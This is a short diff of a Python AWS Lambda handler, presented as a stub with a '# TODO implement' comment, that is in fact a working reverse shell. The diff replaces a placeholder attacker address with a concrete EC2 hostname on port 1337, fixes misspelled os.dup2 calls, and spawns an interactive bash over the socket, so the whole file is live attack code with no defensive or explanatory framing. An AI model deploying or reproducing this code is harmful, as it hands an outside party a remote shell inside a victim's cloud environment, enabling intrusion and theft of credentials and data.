@@ -1,11 +1,11 @@
 import socket,subprocess,os
-#python3
+
 def lambda_handler(event, context):
     # TODO implement
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(("attackIP",port))
-    os.duo2(s.fileno(),0)
-    os.duo2(s.fileno(),1)
-    os.duo2(s.fileno(),2)
+    s.connect(("ec2-54-188-23-26.us-west-2.compute.amazonaws.com",1337))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
     p=subprocess.call(["/bin/bash","-i"])
     return "Exiting.."
